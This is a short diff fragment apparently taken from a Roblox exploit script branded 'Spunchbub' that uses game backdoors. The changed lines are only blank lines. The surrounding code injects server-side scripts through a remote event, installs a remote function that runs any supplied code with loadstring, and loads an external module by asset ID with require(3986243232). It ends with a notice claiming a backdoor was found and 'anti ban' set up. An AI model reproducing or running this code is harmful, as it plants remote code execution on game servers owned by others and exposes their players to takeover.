@@ -1237,6 +1237,7 @@ remoteFunction.OnServerInvoke = function(player, code)
     loadstring(code)()
 end
 ]])
+
 fireRemoteEvent([[
 local Players = game:GetService("Players")
 
@@ -1336,6 +1337,7 @@ Players.PlayerAdded:Connect(function(player)
     task.spawn(monitorPlayer, player)
 end)
 ]])
+    
 fireRemoteEvent('require(3986243232).load("spunchbub anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
         notify.Info("Spunchbub","Backdoor found! Implemented backdoor protection & anti ban.")
     else
